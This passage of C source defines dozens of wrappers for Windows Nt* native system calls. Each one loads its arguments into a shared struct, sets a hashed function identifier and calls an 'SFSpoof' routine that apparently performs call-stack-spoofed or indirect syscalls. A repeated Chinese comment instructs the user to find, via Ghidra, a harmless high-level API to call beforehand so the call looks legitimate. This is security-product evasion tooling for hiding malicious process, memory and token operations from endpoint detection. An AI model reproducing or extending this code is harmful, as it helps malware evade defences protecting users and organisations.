    Params.FuncHash = 0x0A20DFCBF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtIsProcessInJob(HANDLE ProcessHandle, HANDLE JobHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)JobHandle;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0AEC2984B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)RegionSize;
    Params.param[4] = (DWORD_PTR)NewProtect;
    Params.param[5] = (DWORD_PTR)OldProtect;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x097129F93;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySection(HANDLE SectionHandle, SECTION_INFORMATION_CLASS SectionInformationClass, PVOID SectionInformation, ULONG SectionInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)SectionHandle;
    Params.param[2] = (DWORD_PTR)SectionInformationClass;
    Params.param[3] = (DWORD_PTR)SectionInformation;
    Params.param[4] = (DWORD_PTR)SectionInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x03AE2503F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)PreviousSuspendCount;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x09CBFD611;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtTerminateThread(HANDLE ThreadHandle, NTSTATUS ExitStatus) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)ExitStatus;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x06D39A21D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReadRequestData(HANDLE PortHandle, PPORT_MESSAGE Message, ULONG DataEntryIndex, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesRead) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Message;
    Params.param[3] = (DWORD_PTR)DataEntryIndex;
    Params.param[4] = (DWORD_PTR)Buffer;
    Params.param[5] = (DWORD_PTR)BufferSize;
    Params.param[6] = (DWORD_PTR)NumberOfBytesRead;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0381A24A0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)IoStatusBlock;
    Params.param[5] = (DWORD_PTR)AllocationSize;
    Params.param[6] = (DWORD_PTR)FileAttributes;
    Params.param[7] = (DWORD_PTR)ShareAccess;
    Params.param[8] = (DWORD_PTR)CreateDisposition;
    Params.param[9] = (DWORD_PTR)CreateOptions;
    Params.param[10] = (DWORD_PTR)EaBuffer;
    Params.param[11] = (DWORD_PTR)EaLength;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x0BDDB5F9C;
    SFSpoof(Params.FuncHash);
    TCHAR tempFileName[MAX_PATH];
    GetTempFileName(0, 0, 0, tempFileName);
    return 0;
}

NTSTATUS SFNtQueryEvent(HANDLE EventHandle, EVENT_INFORMATION_CLASS EventInformationClass, PVOID EventInformation, ULONG EventInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = (DWORD_PTR)EventInformationClass;
    Params.param[3] = (DWORD_PTR)EventInformation;
    Params.param[4] = (DWORD_PTR)EventInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x086ABEF3E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWriteRequestData(HANDLE PortHandle, PPORT_MESSAGE Request, ULONG DataIndex, PVOID Buffer, ULONG Length, PULONG ResultLength) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Request;
    Params.param[3] = (DWORD_PTR)DataIndex;
    Params.param[4] = (DWORD_PTR)Buffer;
    Params.param[5] = (DWORD_PTR)Length;
    Params.param[6] = (DWORD_PTR)ResultLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0A21ED092;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenDirectoryObject(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)DirectoryHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0AA95DA69;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAccessCheckByTypeAndAuditAlarm(PUNICODE_STRING SubsystemName, PVOID HandleId, PUNICODE_STRING ObjectTypeName, PUNICODE_STRING ObjectName, PSECURITY_DESCRIPTOR SecurityDescriptor, PSID PrincipalSelfSid, ACCESS_MASK DesiredAccess, AUDIT_EVENT_TYPE AuditType, ULONG Flags, POBJECT_TYPE_LIST ObjectTypeList, ULONG ObjectTypeListLength, PGENERIC_MAPPING GenericMapping, BOOLEAN ObjectCreation, PACCESS_MASK GrantedAccess, PULONG AccessStatus, PBOOLEAN GenerateOnClose) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)HandleId;
    Params.param[3] = (DWORD_PTR)ObjectTypeName;
    Params.param[4] = (DWORD_PTR)ObjectName;
    Params.param[5] = (DWORD_PTR)SecurityDescriptor;
    Params.param[6] = (DWORD_PTR)PrincipalSelfSid;
    Params.param[7] = (DWORD_PTR)DesiredAccess;
    Params.param[8] = (DWORD_PTR)AuditType;
    Params.param[9] = (DWORD_PTR)Flags;
    Params.param[10] = (DWORD_PTR)ObjectTypeList;
    Params.param[11] = (DWORD_PTR)ObjectTypeListLength;
    Params.param[12] = (DWORD_PTR)GenericMapping;
    Params.param[13] = (DWORD_PTR)ObjectCreation;
    Params.param[14] = (DWORD_PTR)GrantedAccess;
    Params.param[15] = (DWORD_PTR)AccessStatus;
    Params.param[16] = (DWORD_PTR)GenerateOnClose;
    Params.param[17] = 0;
    Params.ParamNum = 16;
    Params.FuncHash = 0x00BABCCF9;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitForMultipleObjects(ULONG Count, PHANDLE Handles, WAIT_TYPE WaitType, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)Count;
    Params.param[2] = (DWORD_PTR)Handles;
    Params.param[3] = (DWORD_PTR)WaitType;
    Params.param[4] = (DWORD_PTR)Alertable;
    Params.param[5] = (DWORD_PTR)Timeout;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x035BA1D27;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationObject(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = (DWORD_PTR)ObjectInformationClass;
    Params.param[3] = (DWORD_PTR)ObjectInformation;
    Params.param[4] = (DWORD_PTR)ObjectInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x00A960619;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCancelIoFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0B8EA89B0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtTraceEvent(HANDLE TraceHandle, ULONG Flags, ULONG FieldSize, PVOID Fields) {
    Params.param[1] = (DWORD_PTR)TraceHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)FieldSize;
    Params.param[4] = (DWORD_PTR)Fields;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x032A92D02;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPowerInformation(POWER_INFORMATION_LEVEL InformationLevel, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength) {
    Params.param[1] = (DWORD_PTR)InformationLevel;
    Params.param[2] = (DWORD_PTR)InputBuffer;
    Params.param[3] = (DWORD_PTR)InputBufferLength;
    Params.param[4] = (DWORD_PTR)OutputBuffer;
    Params.param[5] = (DWORD_PTR)OutputBufferLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0149A2BD7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, ULONG TitleIndex, ULONG Type, PVOID SystemData, ULONG DataSize) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)ValueName;
    Params.param[3] = (DWORD_PTR)TitleIndex;
    Params.param[4] = (DWORD_PTR)Type;
    Params.param[5] = (DWORD_PTR)SystemData;
    Params.param[6] = (DWORD_PTR)DataSize;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x01580C8D3;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCancelTimer(HANDLE TimerHandle, PBOOLEAN CurrentState) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)CurrentState;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0DB46D9D2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetTimer(HANDLE TimerHandle, PLARGE_INTEGER DueTime, PTIMER_APC_ROUTINE TimerApcRoutine, PVOID TimerContext, BOOLEAN ResumeTimer, LONG Period, PBOOLEAN PreviousState) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)DueTime;
    Params.param[3] = (DWORD_PTR)TimerApcRoutine;
    Params.param[4] = (DWORD_PTR)TimerContext;
    Params.param[5] = (DWORD_PTR)ResumeTimer;
    Params.param[6] = (DWORD_PTR)Period;
    Params.param[7] = (DWORD_PTR)PreviousState;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x003960D0A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAccessCheckByType(PSECURITY_DESCRIPTOR SecurityDescriptor, PSID PrincipalSelfSid, HANDLE ClientToken, ULONG DesiredAccess, POBJECT_TYPE_LIST ObjectTypeList, ULONG ObjectTypeListLength, PGENERIC_MAPPING GenericMapping, PPRIVILEGE_SET PrivilegeSet, PULONG PrivilegeSetLength, PACCESS_MASK GrantedAccess, PULONG AccessStatus) {
    Params.param[1] = (DWORD_PTR)SecurityDescriptor;
    Params.param[2] = (DWORD_PTR)PrincipalSelfSid;
    Params.param[3] = (DWORD_PTR)ClientToken;
    Params.param[4] = (DWORD_PTR)DesiredAccess;
    Params.param[5] = (DWORD_PTR)ObjectTypeList;
    Params.param[6] = (DWORD_PTR)ObjectTypeListLength;
    Params.param[7] = (DWORD_PTR)GenericMapping;
    Params.param[8] = (DWORD_PTR)PrivilegeSet;
    Params.param[9] = (DWORD_PTR)PrivilegeSetLength;
    Params.param[10] = (DWORD_PTR)GrantedAccess;
    Params.param[11] = (DWORD_PTR)AccessStatus;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x0840259B0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAccessCheckByTypeResultList(PSECURITY_DESCRIPTOR SecurityDescriptor, PSID PrincipalSelfSid, HANDLE ClientToken, ACCESS_MASK DesiredAccess, POBJECT_TYPE_LIST ObjectTypeList, ULONG ObjectTypeListLength, PGENERIC_MAPPING GenericMapping, PPRIVILEGE_SET PrivilegeSet, PULONG PrivilegeSetLength, PACCESS_MASK GrantedAccess, PULONG AccessStatus) {
    Params.param[1] = (DWORD_PTR)SecurityDescriptor;
    Params.param[2] = (DWORD_PTR)PrincipalSelfSid;
    Params.param[3] = (DWORD_PTR)ClientToken;
    Params.param[4] = (DWORD_PTR)DesiredAccess;
    Params.param[5] = (DWORD_PTR)ObjectTypeList;
    Params.param[6] = (DWORD_PTR)ObjectTypeListLength;
    Params.param[7] = (DWORD_PTR)GenericMapping;
    Params.param[8] = (DWORD_PTR)PrivilegeSet;
    Params.param[9] = (DWORD_PTR)PrivilegeSetLength;
    Params.param[10] = (DWORD_PTR)GrantedAccess;
    Params.param[11] = (DWORD_PTR)AccessStatus;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x0D2B43CEF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAccessCheckByTypeResultListAndAuditAlarm(PUNICODE_STRING SubsystemName, PVOID HandleId, PUNICODE_STRING ObjectTypeName, PUNICODE_STRING ObjectName, PSECURITY_DESCRIPTOR SecurityDescriptor, PSID PrincipalSelfSid, ACCESS_MASK DesiredAccess, AUDIT_EVENT_TYPE AuditType, ULONG Flags, POBJECT_TYPE_LIST ObjectTypeList, ULONG ObjectTypeListLength, PGENERIC_MAPPING GenericMapping, BOOLEAN ObjectCreation, PACCESS_MASK GrantedAccess, PULONG AccessStatus, PULONG GenerateOnClose) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)HandleId;
    Params.param[3] = (DWORD_PTR)ObjectTypeName;
    Params.param[4] = (DWORD_PTR)ObjectName;
    Params.param[5] = (DWORD_PTR)SecurityDescriptor;
    Params.param[6] = (DWORD_PTR)PrincipalSelfSid;
    Params.param[7] = (DWORD_PTR)DesiredAccess;
    Params.param[8] = (DWORD_PTR)AuditType;
    Params.param[9] = (DWORD_PTR)Flags;
    Params.param[10] = (DWORD_PTR)ObjectTypeList;
    Params.param[11] = (DWORD_PTR)ObjectTypeListLength;
    Params.param[12] = (DWORD_PTR)GenericMapping;
    Params.param[13] = (DWORD_PTR)ObjectCreation;
    Params.param[14] = (DWORD_PTR)GrantedAccess;
    Params.param[15] = (DWORD_PTR)AccessStatus;
    Params.param[16] = (DWORD_PTR)GenerateOnClose;
    Params.param[17] = 0;
    Params.ParamNum = 16;
    Params.FuncHash = 0x0B6ABAE25;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAccessCheckByTypeResultListAndAuditAlarmByHandle(PUNICODE_STRING SubsystemName, PVOID HandleId, HANDLE ClientToken, PUNICODE_STRING ObjectTypeName, PUNICODE_STRING ObjectName, PSECURITY_DESCRIPTOR SecurityDescriptor, PSID PrincipalSelfSid, ACCESS_MASK DesiredAccess, AUDIT_EVENT_TYPE AuditType, ULONG Flags, POBJECT_TYPE_LIST ObjectTypeList, ULONG ObjectTypeListLength, PGENERIC_MAPPING GenericMapping, BOOLEAN ObjectCreation, PACCESS_MASK GrantedAccess, PULONG AccessStatus, PULONG GenerateOnClose) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)HandleId;
    Params.param[3] = (DWORD_PTR)ClientToken;
    Params.param[4] = (DWORD_PTR)ObjectTypeName;
    Params.param[5] = (DWORD_PTR)ObjectName;
    Params.param[6] = (DWORD_PTR)SecurityDescriptor;
    Params.param[7] = (DWORD_PTR)PrincipalSelfSid;
    Params.param[8] = (DWORD_PTR)DesiredAccess;
    Params.param[9] = (DWORD_PTR)AuditType;
    Params.param[10] = (DWORD_PTR)Flags;
    Params.param[11] = (DWORD_PTR)ObjectTypeList;
    Params.param[12] = (DWORD_PTR)ObjectTypeListLength;
    Params.param[13] = (DWORD_PTR)GenericMapping;
    Params.param[14] = (DWORD_PTR)ObjectCreation;
    Params.param[15] = (DWORD_PTR)GrantedAccess;
    Params.param[16] = (DWORD_PTR)AccessStatus;
    Params.param[17] = (DWORD_PTR)GenerateOnClose;
    Params.ParamNum = 17;
    Params.FuncHash = 0x07DD02D6C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAcquireProcessActivityReference() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x030A0790C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAddAtomEx(PWSTR AtomName, ULONG Length, PRTL_ATOM Atom, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)AtomName;
    Params.param[2] = (DWORD_PTR)Length;
    Params.param[3] = (DWORD_PTR)Atom;
    Params.param[4] = (DWORD_PTR)Flags;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x085937FE6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAddBootEntry(PBOOT_ENTRY BootEntry, PULONG Id) {
    Params.param[1] = (DWORD_PTR)BootEntry;
    Params.param[2] = (DWORD_PTR)Id;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x019B40326;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAddDriverEntry(PEFI_DRIVER_ENTRY DriverEntry, PULONG Id) {
    Params.param[1] = (DWORD_PTR)DriverEntry;
    Params.param[2] = (DWORD_PTR)Id;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0DFC826CB;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAdjustGroupsToken(HANDLE TokenHandle, BOOLEAN ResetToDefault, PTOKEN_GROUPS NewState, ULONG BufferLength, PTOKEN_GROUPS PreviousState, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)ResetToDefault;
    Params.param[3] = (DWORD_PTR)NewState;
    Params.param[4] = (DWORD_PTR)BufferLength;
    Params.param[5] = (DWORD_PTR)PreviousState;
    Params.param[6] = (DWORD_PTR)ReturnLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x00F98F590;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

